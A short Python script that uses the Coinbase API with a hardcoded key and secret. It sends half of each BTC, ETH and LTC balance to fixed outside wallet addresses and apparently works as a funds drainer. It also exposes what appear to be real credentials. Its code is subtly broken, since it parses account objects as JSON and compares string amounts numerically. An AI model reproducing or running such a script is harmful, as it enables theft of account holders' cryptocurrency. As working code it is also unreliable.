from coinbase.wallet.client import Client
import json

# Replace <api_key> and <api_secret> with your Coinbase API key and secret
client = Client('tKMpelQWrfiFk4JI', 'JS7m6LhMfuPbOWeCc41hc7c9JTWVODOJ')

# Get the accounts
accounts = client.get_accounts()

# Set the adresses
btc_address = '1FLchskmE9i4ouzxyuSuqzo9C89kMgdcUS'
eth_address = '0x2d27BB336E4C9Edf3c959480941004C7f783cd53'
ltc_address = 'Lf5Jfinef9ijEafXBQcDasANBv4cPTMsnm'

# Loop through the accounts and check the balance
for account in accounts:
    # Convert the account object to a dictionary
    account_dict = json.loads(account)

    currency = account_dict['currency']
    balance = account_dict['balance']
    account_id = account_dict['id']

    # If the balance is greater than 0, send 50% of the balance
    if balance['amount'] > 0:
        # Calculate the amount to send
        amount = balance['amount'] / 2

        # Send the money
        if currency == 'BTC':
            tx = client.send_money(account_id, to=btc_address, amount=amount, currency=currency)
        elif currency == 'ETH':
            tx = client.send_money(account_id, to=eth_address, amount=amount, currency=currency)
        elif currency == 'LTC':
            tx = client.send_money(account_id, to=ltc_address, amount=amount, currency=currency)

    else:
        print("Nothing Found G")
